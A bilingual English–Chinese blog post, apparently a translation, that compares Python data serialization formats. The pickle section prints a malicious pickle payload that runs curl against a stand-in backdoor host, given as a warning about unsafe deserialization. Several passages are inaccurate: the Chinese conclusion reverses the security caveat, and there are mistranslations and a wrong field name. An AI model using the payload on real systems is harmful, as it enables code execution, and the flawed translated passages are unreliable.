---
title: Python的数据序列化(译)
date: 2018-11-30 05:36:48
tags:
categories: 翻译
thumbnail: http://editerupload.eepw.com.cn/201411/48601416902987.jpg
---


# Context 上下文

Processes need to interact with each other and hence they need to speak in same language. The serialization is the process of translating data structures and code objects into data stream in a format that can be stored or transmitted and deserialize back to origin data structure and code objects.

处理流程有时需要相互作用,因此他们需要一种共通的语言.序列化就是这样一个处理流程,它用于将数据类型和代码中的对象转化成可以存储或者可以转化的数据,而且这些数据可以被反序列化为原始的数据结构和代码的对象信息.


# Uses 用法

- Store data from memory into databases or disk.

- Transmit data to other processes or services.

- Remove procedure calls.

-----

- 将数据从内存中存储到数据库或者磁盘.

- 把数据传递给其他进程或者服务

- 删除过程调用

# Solutions 解决方案

A list of serialization technology can be found in [Wikipedia - Comparison of data serialization formats][1]. Below covers the most widely used serialization format in industry.

可以在 [Wikipedia - Comparison of data serialization formats][1] 找到一系列序列化的技术信息.下面讲的这些包含了工业中广泛最应用的一些序列化场景.



## XML

XML stands for eXtensible Markup Language. It's designed to store and transport data and human readable. Below is an example serialized data:

XML是eXtensible Markup Language的缩写,设计出来的目的是存储和传递人可读的数据.下面是一个序列化的例子:

```
<?xml version="1.0" encoding="UTF-8"?>
<book>
  <isbn>9780262510875</isbn>
  <title>Structure and Interpretation of Computer Programs - 2nd Edition</title>
</book>
```

Serialize (in Python 3):

序列化(使用Python3):

```python
>>> root = ET.Element('book')
>>> isbn = ET.SubElement(root, 'isbn')
>>> isbn.text = '9780262510875'
>>> title = ET.SubElement(root, 'title')
>>> title.text = 'Structure and Interpretation of Computer Programs - 2nd Edition'
>>> ET.dump(root)
<book><isbn>9780262510875</isbn><title>Structure and Interpretation of Computer Programs - 2nd Edition</title></book>
```

Deserialize (in Python 3):

反序列化(使用Python3):

```python
>>> import xml.etree.ElementTree as ET

>>> root = ET.fromstring('<?xml version="1.0" encoding="UTF-8"?><book><isbn>9780262510875</isbn><title>Structure and Interpretation of Computer Programs - 2nd Edition</title></book>')

>>> book = {child.tag: child.text for child in root}

>>> book
{'isbn': '9780262510875', 'title': 'Structure and Interpretation of Computer Programs - 2nd Edition'}
```

- Advantages:

    - Most languages support XML well.

    - Well adopted in SOAP methodology.

    - Support attributes in a data structure.

    - Good IDE integration.

- Disadvantages:

    - Serialized content is tedious and long. For example, it requires closing tags like \</isbn>.

    - Usually needs to write extra code to turn XML to code objects


-----

- 优点:
    
    - 大多数编程语言对XML的支持比较好

    - 在 [SOAP](http://www.w3school.com.cn/soap/soap_intro.asp) 方法中很好地使用

    - 在数据结构中支持包含属性信息

    - IDE很给力

- 缺点

    - 序列化后的数据内容很单调而且很长.比如,xml需要类似\</isbn>的结尾标签

    - 通常需要写额外的代码来将xml转换成代码对象.


## JSON

JSON (JavaScript Object Notation) is a lightweight data-interchange format. It's originally a subset of Language JavaScript, however, it's the de facto serialization protocol when providing RESTful API services. Below is an example:

JSON (JavaScript Object Notation) 是一个轻量级的数据交换格式. 它最早是JavaScript语言的一个自己, 不过, 在提供RESTful API时,JSON是事实上的序列化协议.下面是一个JSON序列化的例子.

```json
{
  "name": "EnqueueZero",
  "description": "Enqueue Zero is creating code principles",
  "homepage": "https://github.com/soasme/EnqueueZero",
  "private": false,
  "has_issues": true,
  "has_projects": false,
  "has_wiki": false
}
```

Serialize and deserialize (in Python 3):

序列化和反序列化(使用Python3):

```python
>>> import json

>>> json.dumps({'isbn': '9780262510875', 'title': 'Structure and Interpretation of Computer Programs - 2nd Edition'})
'{"isbn": "9780262510875", "title": "Structure and Interpretation of Computer Programs - 2nd Edition"}'

>>> json.loads('{"isbn": "9780262510875", "title": "Structure and Interpretation of Computer Programs - 2nd Edition"}')
{'isbn': '9780262510875', 'title': 'Structure and Interpretation of Computer Programs - 2nd Edition'}
```

- Advantages:

    - Simple and straightforward specification.

    - Widespread Support. Almost all programming languages support serializing and deserializing JSON in their standard libraries.

    - Human readable.

    - Good IDE integration.

- Disadvantages:

    - Limited data types: null, boolean, string, integer, float, object, array. When serializing some non-supported data types, we converted them into string instead, for example, datetime(1989, 6, 4, 0, 0, 0) can be translated into ISO8601 format first: "1989-06-04T00:00:00+0800".

    - Performance is not good generally when dataset is huge unless you use a library support streaming parsing or writing


-----

- 优点
    
    - 简单而且格式直截了当

    - 广泛支持, 几乎所有的编程语言都原生支持JSON格式数据的序列化和反序列化

    - 人性化,易于阅读

    - IDE支持得不错

- 缺点

    - 支持的数据有限:null, boolean, string, integer, float, object, array. 当序列化一些不支持的数据类型时,就把它转化成string类型.比如数据datatime(1989, 6, 4, 0, 0, 0) 就先转化成ISO08061格式的:"1989-06-04T00:00:00+0800".

    - 数据量非常大时性能不是很好,除非你使用了支持流解析和流读取的库.



## MsgPack 

MessagePack is an efficient binary serialization format. It lets you exchange data among multiple languages like JSON.

MessagePack是一种高效的二进制序列化格式.它允许你在多种语言之间交换数据,比如JSON数据.

Significant difference between JSON:

- Binary format instead of String.
    
- Small integers are encoded into a single byte

- Short strings are encoded with one extra byte in addition to the strings themselves.

与JSON比较不同的地方有:

- 使用的是二进制的形式而不是string.

- 比较小的整数编码成一个单独的类型

- 除了字符串本身外,短字符串还使用一个额外的字节进行编码.

MessagePack usually doesn't have language built-in library support, therefore you generally need to install a library to serialize and deserialize data. For example, in Python, you can install via pip:

MessagePack通常没有语言原生就支持,因此你通常需要安装相应的库来使用MessagePack来序列化和反序列化你的数据,比如在Python中,你可以通过pip安装:

```sh
$ pip install msgpack-python
```

Serialize and deserialize (in Python 3):

序列化和反序列化(使用Python3):

```python
>>> import msgpack
>>> v = msgpack.packb([1, 2, 3], use_bin_type=True)
'\x93\x01\x02\x03'
>>> msgpack.unpackb(v, raw=False)
[1, 2, 3]
```

- Advantages:
    
    - Very efficient.
    
    - Support streaming API.

- Disadvantages:
    
    - No built-in support in most languages.

    - Hard to debug.


- 优点

    - 非常高效

    - 支持流处理的API

- 缺点

    - 没有语言原生支持

    - 难以debug


## Protobuf

Protocol Buffers, known as protobuf, is Google's data interchange format originally and has widely used in many other corporations.

Protobuf就是Protocol Buffers, 它最早是Google的数据交换格式,现在已经广泛应用在许多公司.

Usage:

- Define schemas for data structures in .proto file.

- Use the protocol buffer compiler translate proto into a library.

- Use the given API provided by the generated library to write and read messages.

用法:

- 在.proto文件中定义好各种数据格式的模式信息

- 使用protocol buffer编译器将proto转化成一个库

- 使用这个库中现有API来读写信息.


Below is an example book.proto file:

下面是一个book.proto文件的例子:

```
message Book {
  required string isbn = 1;
  optional string title = 2;
}
```

Generating library is through protoc command.

通过protoc命令生成库:

```
$ protoc -I=$SRC_DIR --python_out=$DST_DIR $SRC_DIR/book.proto
```

This generates book_pb2.py in DST_DIR, which is like below. You should never modify below generated file but to modify proto file first and re-generate:

这就在DST_DIR中产生了如下面所示的book_pb2.py这个文件,切记不要手动更改自动生成文件,不过可以更改proto文件然后重新生成py文件.

```python
class Book(message.Message):
    __metaclass__ = reflection.GeneratedProtocolMessageType
...
```

Serialize:
序列化:

```python
>>> import book_pb2
>>> book = book_pb2.Book()
>>> book.id = '9780262510875'
>>> book.title = 'Structure and Interpretation of Computer Programs - 2nd Edition'
>>> book.SerializeToString()

```

- Advantages:
    
    - Very efficient and impact data.

    - Has tested at scale in industry-level environments.

- Disadvantages:

    - Complicated. Need define proto and generate library first.
    
    - It requires the tool generating library as well. In addition, the generated library needs to exist in both client and server side. This would generally cause problem when schema modified.

    - Hard to debug.


- 优点

    - 非常高效,而且可以更改数据

    - 在工业环境中已经在scala语言中测试过了.

- 缺点

    - 复杂.需要先定义proto文件并生成库

    - 也需要生成库的工具,而且生成库的工具在客户端和服务端都要有,这通常在schema信息变更的时候会出问题.

    - 难以debug


## Thrift

Thrift is similar to ProtoBuf in all likelihood. It shares exact the same processes and concepts like ProtoBuf.

Thrift 跟ProtoBuf很类似,处理数据和流程和方法也跟ProtoBuf很像.

## Language Built-in Serialization

Most languages have their own serialization solutions. There is rare example that data serialized by different languages can be used in other languages. This is mainly because data objects are represented very different in memory.

大多数编程语言都有自己的序列化方案.很少有一个编程语言序列化后的一个数据能被其他编程语言使用的,这主要是因为不同编程语言对于数据对象在内存中的理解室友很大不同的.

For example, in Python, you can use pickle and cPickle:

比如在Python中,你可以使用picke和cPickle:

```python
>>> class Foo:
...     attr = 'A class attribute'
...

>>> import pickle
>>> picklestring = pickle.dumps(Foo)

>>> picklestring
b'\x80\x03c__main__\nFoo\nq\x00.'

>>> pickle.loads(picklestring)
<class '__main__.Foo'>
```

Similar classes or interfaces can be found in other languages, for example, Marshal for Ruby, function serialize for PHP, class implemented java.io.Serializable for Java, etc.

类似的classes和接口在其他语言中也可以找到,比如Ruby的Marshal, PHP的函数序列化, java的序列化类java.io.Serializable等等.

The deserialization is usually dangerous when in language specific format. Deserialization usually means code execution, and therefore, malformed data from untrusted source can harm the system that runs the program. It's the worst choice and generally not recommend to use. Below is an example that a pickled data can send server ip to a backdoor service.

在语言的特定格式下,反序列化通常是危险的,反序列化通常意味着程序在运行,因此,来源不受信任的数据可能会对正在运行程序的系统造成危害,这是最糟糕的选择,通常是不建议这么做的.下面是一个pickle过的数据将服务端IP发送到一个后门服务端的例子:

```python
data  = """cos
system
(S'curl https://example.com/backdoor'
tR.
"""
pickle.loads(data)
```

- Advantage

    - Can support various data types.

- Disadvantage

    - DANGEROUS!

    - Can't be used in other languages.

    - Hard to debug.

- 优点

    - 支持多种数据格式

- 缺点

    - 很危险

    - 在其他语言中无法使用

    - 难以debug

## others 其他类型

INI, TOML and YAML are also human readable serialization formats.
INI, TOML和YAML也是人可读的序列化格式.

| INI | TOML | YAML |
|:---:|:----:|:----:|
| [section] | [section] | section: |
| key=value | key="value" | key:value |

The three serialization formats listed above are often used as configuration file format.

上面列出的三个序列化格式通常以配置文件的方式使用.

- Advantages

    - Human readable and writable.

    - Well-support libraries.

- Disadvantages

    - Not designed for large dataset.

- 优点

    - 人可读可写

    - 有很好的支持库

- 缺点

    - 不适用于大数据集合

CSV is also a popular serialization format. It's in plain text format and pretty good for tabular data. Below is an example one row csv file with a header as first line.

CSV也是一种流程的序列化类型.它采用纯文本的格式,非常适合表格数据,下面是一个csv文件的例子,第一行是标题.

```
ISBN,Title
9780262510875,Structure and Interpretation of Computer Programs - 2nd Edition
```

Serializing CSV are pretty easy in Python 3:

在Python3中非常容易序列化csv数据.

```python
>>> import csv
>>> with open('/tmp/demo.csv', 'w') as f:
...     writer = csv.writer(f)
...     writer.writerow(['ISBN', 'Title'])
...     writer.writerow(['9780262510875', 'Structure and Interpretation of Computer Programs - 2nd Edition'])
```

- Advantage

    - Human readable and writable.
    
    - Good for streaming parsing and large dataset.

    - Good for data with same schema.

    - Non-technical folks can open it in Excel or Google Spreadsheet.

- Disadvantage

    - Type is limited. Usually values are considered as string only.

    - No good support for binary data.

    - Data structure is limited. It only fits tabular data.

- 优点

    - 人可读可写

    - 对流处理和大数据集支持地很好

    - 适用于具有相同模式的数据

    - 非技术人员可以再Excel和Google表格中打开

- 缺点

    - 类型太受限,通常都作为string来处理

    - 对二进制数据不友好

    - 数据结构很受限,只支持表格数据.


# Conclusion 结论

- JSON is usually your first choice. It's simple, human readable, and has most widespread support.

- JSON通常是你的第一选择,它很简单,而且可以直接阅读,编程语言普遍都支持这个格式的数据

- Use MsgPack instead of JSON if performance is an issue.

- 如果性能是个问题的话那就用MsgPack代替JSON吧.

- Use Protobuf if type check and schema check is essential. gRPC is recommended as an RPC framework based on Protobuf.

- 如果需要检查数据类型和数据模式,那就使用Protobuf吧,gRPC是一个值得推荐的基于Protobuf的框架.

- Use Thrift if you're developing RPC services and don't like Protobuf syntax.

- 如果你正开发RPC服务,而且不喜欢ProtoBuf的语法,那就使用Thrift.

- Use TOML if you're serializing some config files.

- 如果你序列化一些配置文件,那就使用TOML吧

- Use CSV if you're serializing data to non-technical people.

- 如果序列化出来的数据是给非技术人员看,那就使用CSV.

- Use INI if you want something simpler.

- 如果想要简洁一点就用INI文件

- Use YAML if you want something more complex.

- 如果想要一些复杂的功能,就是用YAML

- Use language built-in serialization functions or methods if the use case is only limited in a single language, and you 
don't care security that much (not good).

- 如果使用场景就是单单一种语言那就使用编程语言自带的序列化功能或者函数,而且你也不需要担心太多安全问题.



# References 引用

[Avro](https://stackoverflow.com/questions/3429921/what-does-serializable-mean)

[Comparison of data serialization formats](https://en.wikipedia.org/wiki/Comparison_of_data_serialization_formats)

[Don't pickle your data](https://www.benfrederickson.com/dont-pickle-your-data/)

[How do I read and write with msgpack](https://stackoverflow.com/questions/43442194/how-do-i-read-and-write-with-msgpack/43442195)

[Java serialization](https://www.tutorialspoint.com/java/java_serialization.htm)

[Msgpack official website](https://msgpack.org/index.html)

[PHP Manual - serialize](https://php.net/serialize)

[Protocol Buffers](https://developers.google.com/protocol-buffers/)

[Protocol Buffers, Avro, Thrift & MessagePack](https://www.igvita.com/2011/08/01/protocol-buffers-avro-thrift-messagepack/)

[Python Manual - json](https://docs.python.org/2/library/json.html)

[Python Serialization](http://jmoiron.net/blog/python-serialization/)

[Ruby Manual - Markshal](http://ruby-doc.org/core-2.0.0/Marshal.html)

[What does Serializable mean](https://stackoverflow.com/questions/3429921/what-does-serializable-mean)

[What is code serialization](https://stackoverflow.com/questions/447898/what-is-object-serialization)

[Wikipedia - Serialization](https://en.wikipedia.org/wiki/Serialization)

[XML](https://www.w3schools.com/xmL/default.asp)

[You're Using JSON, Why not MessagePack](https://news.ycombinator.com/item?id=2571729)


# Credit

[@vovanz](https://www.reddit.com/user/vovanz): helped on performance and JSON streaming API.

[@Dogeek](https://www.reddit.com/user/Dogeek): helped on configuration serialization.

[@tannhaeuser](https://news.ycombinator.com/user?id=tannhaeuser): helped on CSV piece.


# Discussion 讨论

[Hackernews](https://news.ycombinator.com/item?id=17226781)

[Reddit](https://www.reddit.com/r/Python/comments/8ogk5o/which_is_your_first_choice_of_data_serialization/)


[1]: https://en.wikipedia.org/wiki/Comparison_of_data_serialization_formats
